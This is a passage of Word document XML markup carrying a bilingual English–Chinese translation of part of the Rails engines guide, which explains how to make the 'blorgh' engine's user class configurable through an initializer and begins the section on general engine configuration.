          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关系，现在会是这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4E5B8C1A" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15F76147" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1345938450"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>belongs_to :author, :class_name</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; Blorgh.user_class</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="291A9AD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The </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>set_author</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> method also located in this class should also use this class: </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>set_author</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法也位于这个类中应该也使用这个类：</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732DE2D8" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7CB2D1F7" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="761072006"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>self.author = Blorgh.user_class.constantize.find_or_create_by_name(author_name)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42646AE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要保存在任何时候调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>constantize</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，作为替代你可以仅仅覆盖在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/blorgh.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘module’ 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> getter method 用于在返回结果之前的保存值的时候总是调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>constantize</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0C198B6E" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2165480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def</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>self.user_class</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45890BE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@@user_class.constantize</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="359ABB8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4B06BCD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This would then turn the above code for </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>self.author=</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> into this: 这里将会转换上面对于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>self.author=</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的代码成这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="373B9DD2" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C86B787" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1110471419"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>self.author = Blorgh.user_class.find_or_create_by_name(author_name)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05224AB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结果要短一点了，在行为上更加含蓄。</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法应该总是返回一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F994EF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To set this configuration setting within the application, an initializer should be used. By using an initializer, the configuration will be set up before the application starts and calls the engine’s models which may depend on this configuration setting existing. 要在应用程序中设置这个配置，会使用一个 ’initializer’。通过使用一个 ’initializer’，配置信息将会在启动应用程序和调用 engine 的 ‘model’ 之前被设置好，它可能依赖于存在的 configuration setting。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0777E0B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在安装了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> engine 的应用程序中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers/blorgh.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 创建一个新的 ’initializer’并且放入如下内容：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0512BDD5" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1CF52ED7" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1853912967"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Blorgh.user_class = "User"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B09520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这里的类使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>String</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 版的很重要，而不是类本身。如果你使用的类 Rails 会尝试导入这个类并且引用相关的表，这里可能会导致问题如果表不存在。因此，一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>String</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 应该被使用并且转换一个存在的类后面通过使用 engine 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>constantize</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9D5CA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Go ahead and try to create a new post. You will see that it works exactly in the same way as before, except this time the engine is using the configuration setting in </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers/blorgh.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to learn what the class is. 继续向前并且尝试创建一个新的文章。你将会看到和开始工作的方式一样的，但这次 engine 使用在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers/blorgh.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的配置设置来学习类是什么。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F7E7F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There are now no strict dependencies on what the class is, only what the class’s API must be. The engine simply requires this class to define a </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>find_or_create_by_name</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> method which returns an object of that class to be associated with a post when it’s created. This object, of course, should have some sort of identifier by which it can be referenced. 这里现在并不严格依赖于类是什么（不管存在与否，只是字符串），仅仅是依赖（Engine类的）类 ’API’。engine 简单的请求这个类定义一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>find_or_create_by_name</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法用来访问文章创建的时候关联的类的对象。这个对象，当然，应该有能够引用它的一系列的 ’identifier’。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8A5686"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4.4.2 General engine configuration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05265F8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Within an engine, there may come a time where you wish to use things such as initializers, internationalization or other configuration options. The great news is that these things are entirely possible because a Rails engine shares much the same functionality as a Rails application. In fact, a Rails application’s functionality is actually a superset of what is provided by engines! 在一个 engine 中，有时候你会希望使用这样的东西例如 initializers， internationalization 或者 其他的 configuration 选项。好消息是这些是完全可能的因为Rails engine 共享了很多与应用程序相同的功能。事实上，一个 Rails 应用程序的功能实际上是一个由 engine 提供的功能的大集合！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2C5AF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If you wish to use an initializer — code that should run before the engine is loaded — the place for it is the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> folder. This directory’s functionality is explained in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1000" w:anchor="initializers" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Initializers section</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the Configuring guide, and works precisely the same way as the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory inside an application. Same goes for if you want to use a standard initializer. 如果你希望使用一个 ‘initializer’ — 代码应该在 engine 被导入之前运行 — 它的位置在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件夹。这个目录的功能的解释在配置教程 </w:t>
      </w:r>
      <w:hyperlink r:id="rId1001" w:anchor="initializers" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Initializers section</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
